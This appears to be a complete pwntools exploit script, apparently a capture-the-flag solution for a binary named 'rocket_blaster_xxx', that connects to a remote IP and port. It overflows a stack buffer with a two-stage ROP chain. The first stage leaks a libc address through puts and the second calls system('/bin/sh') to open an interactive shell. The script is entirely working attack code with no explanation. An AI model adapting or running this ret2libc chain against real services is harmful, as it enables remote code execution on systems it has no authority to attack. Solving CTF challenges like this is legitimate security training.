from pwn import *

exe = ELF("rocket_blaster_xxx_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "94.237.54.183"
remote_port = 41539
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d

# 1st ROP: Leak libc via puts, then return back to main
payload = b'a'*0x20
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)
sla(b'>> ', payload)
r.recvuntil(b'\nPreparing beta testing..\n')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - libc.sym.puts
logleak('libc.address', libc.address)

# 2nd ROP: Call system("/bin/sh")
payload = b'a'*0x20
payload += p64(exe.bss()+0x100)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)
sla(b'>> ', payload)

r.interactive()

